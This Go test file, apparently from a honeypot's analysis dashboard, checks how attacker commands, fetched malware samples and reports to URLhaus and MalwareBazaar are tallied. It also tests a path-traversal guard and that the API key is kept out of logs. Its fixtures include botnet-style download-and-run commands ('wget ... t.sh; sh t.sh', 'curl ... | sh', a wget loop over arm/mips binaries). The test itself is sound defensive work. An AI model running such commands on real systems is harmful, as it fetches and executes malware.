package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// Tab „Funde“: Fundbuch und Fallakte aus Befehlen, Downloads, eigenem Holen und Protokollen.
func TestFundeAndFile(t *testing.T) {
	allowDoc(t)
	setOwnNets(OwnNets{Private: true})
	h := shareHive(t)
	script := "#!/bin/sh\ncd /tmp\nfor a in arm mips; do wget http://198.51.100.20/bins/$a; done\nwget http://198.51.100.20/bins/arm7\x07\n"
	sum := sha256.Sum256([]byte(script))
	sha := hex.EncodeToString(sum[:])
	os.MkdirAll(h.share.dir, 0o700)
	if err := os.WriteFile(filepath.Join(h.share.dir, sha), []byte(script), 0o600); err != nil {
		t.Fatal(err)
	}
	addEvent(h, "command", "ssh", "203.0.113.50", "", "", map[string]any{"input": "cd /tmp; wget http://198.51.100.20/t.sh; sh t.sh"})
	addEvent(h, "command", "ssh", "203.0.113.51", "", "", map[string]any{"input": "curl http://198.51.100.20/t.sh | sh"})
	addEvent(h, "command", "telnet", "203.0.113.52", "", "", map[string]any{"input": "wget http://192.168.1.1/x"}) // Heimnetz
	addEvent(h, "download", "ssh", "203.0.113.53", "", "", map[string]any{"filename": "/tmp/up", "upload": true})  // ohne Adresse
	addEvent(h, "ai_reply", "ssh", "203.0.113.50", "", "", map[string]any{"kind": "shell", "input": "uname -a", "output": "Linux srv 5.15"})
	h.st.lookupPut(urlSubject("http://198.51.100.20/t.sh"), "sample_fetch", `{"status":"ok","sha256":"`+sha+`","file_tag":"sh","malware":true}`)
	h.st.lookupPut(urlSubject("http://198.51.100.20/bins/arm7"), "sample_fetch", `{"status":"error","error":"404"}`)
	h.share.add("urlhaus", shareLogEntry{Time: time.Now(), Status: "error", Subject: "http://198.51.100.20/t.sh", Error: "URLhaus ordnet die Meldung keinem Konto zu", Sent: "POST https://urlhaus.abuse.ch/api/ (Auth-Key: •••)"})
	h.share.add("bazaar", shareLogEntry{Time: time.Now(), Status: "known", Subject: sha, SHA256: sha, Detail: "bei MalwareBazaar bekannt"})
	h.st.lookupPut("hash:"+sha, "bazaar_upload", "known")

	rec := httptest.NewRecorder()
	h.funde(rec, httptest.NewRequest("GET", "/api/funde?range=7d", nil))
	if rec.Code != 200 {
		t.Fatalf("%d %s", rec.Code, rec.Body)
	}
	var d struct {
		Funnel  map[string]int `json:"funnel"`
		URLs    []fundURL      `json:"urls"`
		Skipped []fundURL      `json:"skipped"`
		Files   []fundFile     `json:"files"`
		Atts    []fundAttacker `json:"attackers"`
		AI      []fundAI       `json:"ai"`
		Infra   []fundInfra    `json:"infra"`
		Prov    []fundProvider `json:"providers"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &d); err != nil {
		t.Fatal(err)
	}
	if d.Funnel["seen"] != 2 || d.Funnel["allowed"] != 1 || d.Funnel["fetched"] != 1 || d.Funnel["malware"] != 1 || d.Funnel["urlhaus_error"] != 1 {
		t.Fatalf("Trichter: %v", d.Funnel)
	}
	if len(d.URLs) != 1 || d.URLs[0].Uses != 2 || d.URLs[0].NIPs != 2 || d.URLs[0].URLhaus != "error" || d.URLs[0].SHA256 != sha {
		t.Fatalf("Adressen: %+v", d.URLs)
	}
	if len(d.Skipped) != 1 || !strings.Contains(d.Skipped[0].Why, "nicht zulässig") {
		t.Fatalf("nicht geholt: %+v", d.Skipped)
	}
	if len(d.Files) != 1 || d.Files[0].Type != "Skript" || d.Files[0].Bazaar != "known" || d.Files[0].URLhaus != "error" || d.Files[0].Name != "t.sh" || len(d.Files[0].IPs) != 2 {
		t.Fatalf("Dateien: %+v", d.Files)
	}
	if len(d.Atts) != 2 || len(d.AI) != 1 || d.AI[0].Input != "uname -a" {
		t.Fatalf("Angreifer %d, KI %+v", len(d.Atts), d.AI)
	}
	if len(d.Infra) == 0 || len(d.Prov) != 5 || d.Prov[0].Kind != "abuseipdb" {
		t.Fatalf("Infrastruktur %+v, Anbieter %d", d.Infra, len(d.Prov))
	}

	// Fallakte
	rec = httptest.NewRecorder()
	h.fundeFile(rec, httptest.NewRequest("GET", "/api/funde/file?sha="+sha, nil))
	if rec.Code != 200 {
		t.Fatalf("%d %s", rec.Code, rec.Body)
	}
	var a struct {
		Script []string       `json:"script"`
		Stages []stageInfo    `json:"stages"`
		Audit  []auditEntry   `json:"audit"`
		Atts   []fundAttacker `json:"attackers"`
		AI     []fundAI       `json:"ai"`
	}
	json.Unmarshal(rec.Body.Bytes(), &a)
	if len(a.Script) < 4 || a.Script[0] != "#!/bin/sh" || strings.ContainsRune(strings.Join(a.Script, ""), 7) {
		t.Fatalf("Skript: %q", a.Script)
	}
	var arm7 *stageInfo
	for i := range a.Stages {
		if a.Stages[i].URL == "http://198.51.100.20/bins/arm7" {
			arm7 = &a.Stages[i]
		}
	}
	if arm7 == nil || arm7.Fetch != "error" {
		t.Fatalf("Stufen: %+v", a.Stages)
	}
	kinds := map[string]bool{}
	for _, e := range a.Audit {
		kinds[e.Kind+":"+e.Status] = true
	}
	if !kinds["urlhaus:error"] || !kinds["bazaar:known"] || len(a.Atts) != 2 || len(a.AI) != 1 {
		t.Fatalf("Protokoll %v, Angreifer %d, KI %d", kinds, len(a.Atts), len(a.AI))
	}
	rec = httptest.NewRecorder()
	h.fundeFile(rec, httptest.NewRequest("GET", "/api/funde/file?sha=../etc", nil))
	if rec.Code != 400 {
		t.Fatalf("ungültiger Hash: %d", rec.Code)
	}
}

// Das Prüfprotokoll speichert den gesendeten Wortlaut ohne Schlüssel.
func TestURLhausLogSentWithoutKey(t *testing.T) {
	allowDoc(t)
	h := shareHive(t)
	x := h.Extras()
	x.AbuseChKey = "geheim-123"
	x.URLhausReport = URLhausReportConfig{Enabled: true, DryRun: true, DailyLimit: 5}
	x.ReportDelayMin = 0
	h.urlhausSubmit(t.Context(), x, []urlFinding{{URL: "http://198.51.100.20/x.sh", Service: "ssh"}})
	e, ok := h.share.lastFor("urlhaus", func(shareLogEntry) bool { return true })
	if !ok || !strings.Contains(e.Sent, `"url": "http://198.51.100.20/x.sh"`) || strings.Contains(e.Sent, "geheim") {
		t.Fatalf("%+v", e)
	}
}
